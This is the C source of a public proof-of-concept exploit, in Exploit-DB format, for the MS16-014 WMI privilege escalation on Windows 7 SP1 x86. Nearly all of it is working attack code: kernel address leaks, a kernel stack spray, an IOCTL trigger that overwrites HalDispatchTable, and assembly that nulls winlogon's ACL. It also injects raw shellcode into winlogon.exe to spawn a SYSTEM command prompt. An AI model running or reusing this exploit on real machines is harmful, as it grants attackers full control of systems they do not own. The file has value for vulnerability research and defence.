/* 
# Exploit Title: Elevation of privilege on Windows 7 SP1 x86
# Date: 28/06-2016
# Exploit Author: @blomster81
# Vendor Homepage: [url]www.microsoft.com[/url]
# Version: Windows 7 SP1 x86
# Tested on: Windows 7 SP1 x86
# CVE : 2016-0400
   
MS16-014 EoP PoC created from 
[url]https://github.com/Rootkitsmm/cve-2016-0040/blob/master/poc.cc[/url]
Spawns CMD.exe with SYSTEM rights. 
Overwrites HaliSystemQueryInformation, but does not replace it, so BSOD will occur at some point
   
********* EDB Note *********
   
ntos.h is available here: [url]https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/40039.zip[/url]
   
***************************
   
*/
   
#include "stdafx.h"
#include <Windows.h>
#include <winioctl.h>
#include "ntos.h"
#include <TlHelp32.h>
   
   
typedef union {
    HANDLE Handle;
    ULONG64 Handle64;
    ULONG32 Handle32;
}
HANDLE3264, *PHANDLE3264;
   
typedef struct {
    ULONG HandleCount;
    ULONG Action;
    HANDLE /* PUSER_THREAD_START_ROUTINE */ UserModeCallback;
    HANDLE3264 UserModeProcess;
    HANDLE3264 Handles[20];
}
WMIRECEIVENOTIFICATION, *PWMIRECEIVENOTIFICATION;
   
#define RECEIVE_ACTION_CREATE_THREAD 2 // Mark guid objects as requiring
   
typedef struct {
    IN VOID * ObjectAttributes;
    IN ACCESS_MASK DesiredAccess;
   
    OUT HANDLE3264 Handle;
}
WMIOPENGUIDBLOCK, *PWMIOPENGUIDBLOCK;
   
typedef enum _KPROFILE_SOURCE {
    ProfileTime,
    ProfileAlignmentFixup,
    ProfileTotalIssues,
    ProfilePipelineDry,
    ProfileLoadInstructions,
    ProfilePipelineFrozen,
    ProfileBranchInstructions,
    ProfileTotalNonissues,
    ProfileDcacheMisses,
    ProfileIcacheMisses,
    ProfileCacheMisses,
    ProfileBranchMispredictions,
    ProfileStoreInstructions,
    ProfileFpInstructions,
    ProfileIntegerInstructions,
    Profile2Issue,
    Profile3Issue,
    Profile4Issue,
    ProfileSpecialInstructions,
    ProfileTotalCycles,
    ProfileIcacheIssues,
    ProfileDcacheAccesses,
    ProfileMemoryBarrierCycles,
    ProfileLoadLinkedIssues,
    ProfileMaximum
   
} KPROFILE_SOURCE, *PKPROFILE_SOURCE;
   
typedef struct _DESKTOPINFO
{
    /* 000 */ PVOID        pvDesktopBase;
    /* 008 */ PVOID        pvDesktopLimit;
   
} DESKTOPINFO, *PDESKTOPINFO;
   
   
typedef struct _CLIENTINFO
{
    /* 000 */ DWORD             CI_flags;
    /* 004 */ DWORD             cSpins;
    /* 008 */ DWORD             dwExpWinVer;
    /* 00c */ DWORD             dwCompatFlags;
    /* 010 */ DWORD             dwCompatFlags2;
    /* 014 */ DWORD             dwTIFlags;
    /* 018 */ DWORD             filler1;
    /* 01c */ DWORD             filler2;
    /* 020 */ PDESKTOPINFO      pDeskInfo;
    /* 028 */ ULONG_PTR         ulClientDelta;
   
} CLIENTINFO, *PCLIENTINFO;
   
typedef struct _HANDLEENTRY {
    PVOID  phead;
    ULONG_PTR  pOwner;
    BYTE  bType;
    BYTE  bFlags;
    WORD  wUniq;
}HANDLEENTRY, *PHANDLEENTRY;
   
typedef struct _SERVERINFO {
    DWORD dwSRVIFlags;
    DWORD64 cHandleEntries;
    WORD wSRVIFlags;
    WORD wRIPPID;
    WORD wRIPError;
}SERVERINFO, *PSERVERINFO;
   
typedef struct _SHAREDINFO {
    PSERVERINFO psi;
    PHANDLEENTRY aheList;
    ULONG HeEntrySize;
    ULONG_PTR pDispInfo;
    ULONG_PTR ulSharedDelta;
    ULONG_PTR awmControl;
    ULONG_PTR DefWindowMsgs;
    ULONG_PTR DefWindowSpecMsgs;
}SHAREDINFO, *PSHAREDINFO;
   
#define IOCTL_WMI_RECEIVE_NOTIFICATIONS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x51, METHOD_BUFFERED, FILE_WRITE_ACCESS)
   
typedef ULONG(__stdcall *g_ZwMapUserPhysicalPages)(PVOID, ULONG, PULONG);
typedef NTSTATUS(_stdcall *_NtQuerySystemInformation)(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);
typedef NTSTATUS(_stdcall *_NtQueryIntervalProfile)(KPROFILE_SOURCE ProfilSource, PULONG Interval);
   
DWORD g_HalDispatchTable = 0;
void* kHandle;
HWND g_window = NULL;
const WCHAR g_windowClassName[] = L"Victim_Window";
WNDCLASSEX wc;
PSHAREDINFO g_pSharedInfo;
PSERVERINFO g_pServerInfo;
HANDLEENTRY* g_UserHandleTable;
   
LRESULT CALLBACK WProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
    return DefWindowProc(hwnd, uMsg, wParam, lParam);
}
   
DWORD getProcessId(wchar_t* str)
{
    HANDLE hProcessSnap;
    PROCESSENTRY32 pe32;
    DWORD PID;
   
    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE)
    {
        return 0;
    }
   
    pe32.dwSize = sizeof(PROCESSENTRY32);
    if (!Process32First(hProcessSnap, &pe32))
    {
        CloseHandle(hProcessSnap);
        return 0;
    }
   
    do
    {
        if (!wcscmp(pe32.szExeFile, str))
        {
            wprintf(L"Process: %s found\n", pe32.szExeFile);
            PID = pe32.th32ProcessID;
            return PID;
        }
    } while (Process32Next(hProcessSnap, &pe32));
    return 0;
}
   
void Launch()
{
    void* pMem;
    char shellcode[] =
        "\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30"
        "\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
        "\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2"
        "\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85"
        "\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3"
        "\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d"
        "\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58"
        "\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b"
        "\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff"
        "\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x6a\x01\x8d\x85\xb9\x00"
        "\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a"
        "\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75"
        "\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5\x63\x6d\x64\x2e"
        "\x65\x78\x65\x00";
   
    wchar_t* str = L"winlogon.exe";
    DWORD PID = getProcessId(str);
    HANDLE hEx = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
    pMem = VirtualAllocEx(hEx, NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    DWORD res = WriteProcessMemory(hEx, pMem, shellcode, sizeof(shellcode), 0);
    HANDLE res2 = CreateRemoteThread(hEx, NULL, 0, (LPTHREAD_START_ROUTINE)pMem, NULL, 0, NULL);
}
   
BOOL leakHal()
{
    _NtQuerySystemInformation NtQuerySystemInformation = (_NtQuerySystemInformation)GetProcAddress(GetModuleHandleA("NTDLL.DLL"), "NtQuerySystemInformation");
    PRTL_PROCESS_MODULES pModuleInfo;
    DWORD ntoskrnlBase;
    DWORD HalDTUser, HalDTOffset;
    HMODULE userKernel;
   
    pModuleInfo = (PRTL_PROCESS_MODULES)VirtualAlloc(NULL, 0x100000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pModuleInfo == NULL)
    {
        printf("Could not allocate memory\n");
        return FALSE;
    }
    NtQuerySystemInformation(SystemModuleInformation, pModuleInfo, 0x100000, NULL);
    ntoskrnlBase = (DWORD)pModuleInfo->Modules[0].ImageBase;
    userKernel = LoadLibraryEx(L"ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (userKernel == NULL)
    {
        printf("Could not load ntoskrnl.exe\n");
        return FALSE;
    }
   
    HalDTUser = (DWORD)GetProcAddress(userKernel, "HalDispatchTable");
    HalDTOffset = HalDTUser - (DWORD)userKernel;
    g_HalDispatchTable = ntoskrnlBase + HalDTOffset + 0x9000;
    return TRUE;
}
   
BOOL setup()
{
    LoadLibraryA("user32.dll");
   
    wc.cbSize = sizeof(WNDCLASSEX);
    wc.style = 0;
    wc.lpfnWndProc = WProc;
    wc.cbClsExtra = 0;
    wc.cbWndExtra = 0;
    wc.hInstance = NULL;
    wc.hCursor = NULL;
    wc.hIcon = NULL;
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    wc.lpszMenuName = NULL;
    wc.lpszClassName = g_windowClassName;
    wc.hIconSm = NULL;
   
    if (!RegisterClassEx(&wc))
    {
        printf("Failed to register window: %d\n", GetLastError());
        return FALSE;
    }
    g_window = CreateWindowEx(WS_EX_CLIENTEDGE, g_windowClassName, L"Victim_Window", WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, 240, 120, NULL, NULL, NULL, NULL);
    if (g_window == NULL)
    {
        printf("Failed to create window: %d\n", GetLastError());
        return FALSE;
    }
   
    g_pSharedInfo = (PSHAREDINFO)GetProcAddress(LoadLibraryA("user32.dll"), "gSharedInfo");
    g_UserHandleTable = g_pSharedInfo->aheList;
    g_pServerInfo = g_pSharedInfo->psi;
   
    return TRUE;
}
   
DWORD leakWndAddr(HWND hwnd)
{
    DWORD addr = 0;
    HWND kernelHandle = NULL;
   
    for (int i = 0; i < g_pServerInfo->cHandleEntries; i++)
    {
        kernelHandle = (HWND)(i | (g_UserHandleTable[i].wUniq << 0x10));
        if (kernelHandle == hwnd)
        {
            addr = (DWORD)g_UserHandleTable[i].phead;
            break;
        }
    }
    return addr;
}
   
VOID SprayKernelStack() {
    g_ZwMapUserPhysicalPages ZwMapUserPhysicalPages = (g_ZwMapUserPhysicalPages)GetProcAddress(GetModuleHandleA("NTDLL.DLL"), "ZwMapUserPhysicalPages");
    if (ZwMapUserPhysicalPages == NULL)
    {
        printf("Could not get ZwMapUserPhysicalPages\n");
        return;
    }
    BYTE buffer[4096];
    DWORD value = g_HalDispatchTable - 0x3C + 0x4;
    for (int i = 0; i < sizeof(buffer) / 4; i++)
    {
        memcpy(buffer + i * 4, &value, sizeof(DWORD));
    }
    printf("Where is at: 0x%x\n", buffer);
    ZwMapUserPhysicalPages(buffer, sizeof(buffer) / sizeof(DWORD), (PULONG)buffer);
}
   
__declspec(noinline) int Shellcode()
{
    __asm {
        mov eax, kHandle // WND - Which window? Check this
        mov eax, [eax + 8] // THREADINFO
        mov eax, [eax] // ETHREAD
        mov eax, [eax + 0x150] // KPROCESS
        mov eax, [eax + 0xb8] // flink
        procloop:
        lea edx, [eax - 0xb8] // KPROCESS
        mov eax, [eax]
        add edx, 0x16c // module name
        cmp dword ptr[edx], 0x6c6e6977 // �winl� for winlogon.exe
        jne procloop
        sub edx, 0x170
        mov dword ptr[edx], 0x0 // NULL ACL
        ret
    }
}
   
int main() {
    DWORD dwBytesReturned;
    HANDLE threadhandle;
    WMIRECEIVENOTIFICATION buffer;
    CHAR OutPut[1000];
   
    if (!setup())
    {
        printf("Could not setup window\n");
        return 0;
    }
   
   
    PVOID userSC = VirtualAlloc((VOID*)0x2a000000, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    kHandle = (void*)leakWndAddr(g_window);
    memset(userSC, 0x41, 0x1000);
    memcpy(userSC, Shellcode, 0x40);
   
   
    if (!leakHal())
    {
        printf("Could not leak Hal\n");
        return 0;
    }
    printf("HalDispatchTable is at: 0x%x\n", g_HalDispatchTable);
   
    DWORD value = (DWORD)userSC;
    PBYTE buff = (PBYTE)&buffer;
    for (int i = 0; i < sizeof(buffer) / 4; i++)
    {
        memcpy(buff + i * 4, &value, sizeof(DWORD));
    }
    printf("What is at: 0x%x\n", buff);
   
    buffer.HandleCount = 0;
    buffer.Action = RECEIVE_ACTION_CREATE_THREAD;
    buffer.UserModeProcess.Handle = GetCurrentProcess();
   
    HANDLE hDriver = CreateFileA("\\\\.\\WMIDataDevice", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hDriver != INVALID_HANDLE_VALUE) {
        SprayKernelStack();
   
        if (!DeviceIoControl(hDriver, IOCTL_WMI_RECEIVE_NOTIFICATIONS, &buffer, sizeof(buffer), &OutPut, sizeof(OutPut), &dwBytesReturned, NULL)) {
            return 1;
        }
   
    }
    _NtQueryIntervalProfile NtQueryIntervalProfile = (_NtQueryIntervalProfile)GetProcAddress(GetModuleHandleA("NTDLL.DLL"), "NtQueryIntervalProfile");
    ULONG result;
    KPROFILE_SOURCE stProfile = ProfileTotalIssues;
    NtQueryIntervalProfile(stProfile, &result);
    printf("SYSTEM shell comming\n");
    Launch();
    printf("All done, exiting\n");
   
    return 0;
}